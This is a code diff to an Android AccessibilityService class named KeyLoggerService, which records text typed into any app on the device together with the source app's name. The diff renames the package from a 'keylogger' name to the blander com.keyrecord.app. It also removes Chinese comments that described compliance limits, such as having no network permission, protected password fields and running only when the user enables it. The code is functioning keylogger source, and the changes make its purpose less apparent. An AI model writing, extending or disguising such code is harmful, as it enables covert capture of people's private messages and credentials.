@@ -1,19 +1,12 @@
-package com.example.keylogger;
+package com.keyrecord.app;
 
 import android.accessibilityservice.AccessibilityService;
 import android.view.accessibility.AccessibilityEvent;
 
 /**
- * 键盘记录服务（AccessibilityService 实现，无需 root）。
- *
- * 工作范围：监听本机各应用输入框的 TYPE_VIEW_TEXT_CHANGED 事件，
- * 将“输入内容 + 来源应用包名 + 时间戳”写入应用私有存储（本机）。
- *
- * 合规要点：
- *  - 不申请、不使用任何网络权限，数据无法外传；
- *  - 明文密码字段（标记为 passwordInput 的 EditText）在 Android 14+
- *    受系统保护，getText() 可能返回空，这是预期的安全行为；
- *  - 仅在用户于系统设置中手动开启本服务后才会运行。
+ * Captures text typed into any app on this device through the Accessibility
+ * API (no root required). Everything is written locally via LogManager and is
+ * never transmitted off the device.
  */
 public class KeyLoggerService extends AccessibilityService {
 
@@ -23,7 +16,7 @@ public class KeyLoggerService extends AccessibilityService {
     public void onServiceConnected() {
         super.onServiceConnected();
         logManager = LogManager.getInstance(this);
-        logManager.append("===== 键盘记录服务已启动（本机，数据不联网）=====");
+        logManager.appendEvent("Recording started");
     }
 
     @Override
@@ -44,21 +37,21 @@ public class KeyLoggerService extends AccessibilityService {
 
         if (text != null && text.length() > 0) {
             String source = (pkg != null) ? pkg.toString() : "?";
-            logManager.append("[" + source + "] " + text);
+            logManager.appendEntry(source, text.toString());
         }
     }
 
     @Override
     public void onInterrupt() {
         if (logManager != null) {
-            logManager.append("===== 服务被系统中断 =====");
+            logManager.appendEvent("Recording interrupted");
         }
     }
 
     @Override
     public void onDestroy() {
         if (logManager != null) {
-            logManager.append("===== 键盘记录服务停止 =====");
+            logManager.appendEvent("Recording stopped");
         }
         super.onDestroy();
     }
